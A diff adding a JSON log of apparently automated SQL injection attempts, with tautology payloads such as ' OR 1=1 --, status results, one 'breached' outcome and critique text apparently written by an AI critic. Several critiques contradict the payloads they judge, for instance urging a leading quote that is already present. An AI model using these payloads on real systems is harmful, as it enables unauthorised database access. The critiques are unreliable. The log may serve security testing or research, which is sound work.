@@ -1,0 +1,42 @@
+[
+    {
+        "attempt_number": 1,
+        "vuln_type": "sqli",
+        "payload": "' OR 1=1 --",
+        "server_response_summary": "200",
+        "gamma_critique": "N/A",
+        "outcome": "breached"
+    },
+    {
+        "attempt_number": 1,
+        "vuln_type": "sqli",
+        "payload": "' OR 1=2 --",
+        "server_response_summary": "Status 200",
+        "gamma_critique": "The payload ' OR 1=2 -- failed to breach the SQLi vulnerability because the response code 200 with a \"status\":\"fail\" response body snippet indicates that the payload was likely executed as a valid SQL query, but did not produce the desired outcome. You are trapped inside a string, start your next payload with a leading quote (e.g., ' ) to break out of the query structure.",
+        "outcome": "failed"
+    },
+    {
+        "attempt_number": 2,
+        "vuln_type": "sqli",
+        "payload": "' OR 'x'='x --",
+        "server_response_summary": "Status 200",
+        "gamma_critique": "The payload ' OR 'x'='x -- failed to breach the SQLi vulnerability because it did not attempt to break out of the string literal, as indicated by the lack of SQL syntax errors in the response. You are trapped inside a string, start your next payload with a leading quote (e.g., ' ) to break out of the query structure.",
+        "outcome": "failed"
+    },
+    {
+        "attempt_number": 3,
+        "vuln_type": "sqli",
+        "payload": "' OR 1=2 --",
+        "server_response_summary": "Status 200",
+        "gamma_critique": "You are trapped inside a string. The payload ' OR 1=2 -- failed to breach the SQLi vulnerability because the '--' comment is not sufficient to break out of the string literal, as the application is likely using a more robust string escaping mechanism.",
+        "outcome": "failed"
+    },
+    {
+        "attempt_number": 4,
+        "vuln_type": "sqli",
+        "payload": "' OR 'a'='a' OR '1'='1 --",
+        "server_response_summary": "Status 200",
+        "gamma_critique": "The payload ' OR 'a'='a' OR '1'='1 -- failed to breach the SQLi vulnerability because it appears to be properly handled by the application, as indicated by the {\"status\":\"fail\"} response. You are trapped inside a string, start your next payload with a leading quote (e.g., ' ) to break out of the query structure.",
+        "outcome": "failed"
+    }
+]
